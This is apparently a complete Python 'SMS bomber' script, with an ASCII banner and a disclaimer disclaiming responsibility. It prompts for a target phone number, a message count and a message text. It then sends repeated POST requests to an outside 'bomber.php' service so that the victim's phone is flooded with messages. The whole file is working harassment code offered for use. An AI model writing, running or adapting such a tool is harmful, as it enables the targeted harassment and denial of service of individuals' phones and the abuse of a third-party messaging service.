from urllib.request import Request,urlopen
from urllib.parse import urlencode
import platform
import os
import time

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""

  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                  
Brought To You By : T3r@bYt3                                                                                                      
Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")


def send(num, counter, slep, msg):
    url="https://www.saqlainweb.com/bomber.php"
    data={"phone":num,"loop":1,"message":msg}
    for x in range(counter):
        banner()
        print("Target Number          : ", num)
        print("Message Body           : ", msg)
        print("Number of Message Sent : ", x+1)
        resp=Request(url,urlencode(data).encode())
        urlopen(resp).read().decode()
        time.sleep(slep)

banner()
send(input("Enter Target Number : "), int(input("Enter Number of Messages : ")), 1, input("Enter Message Body : "))
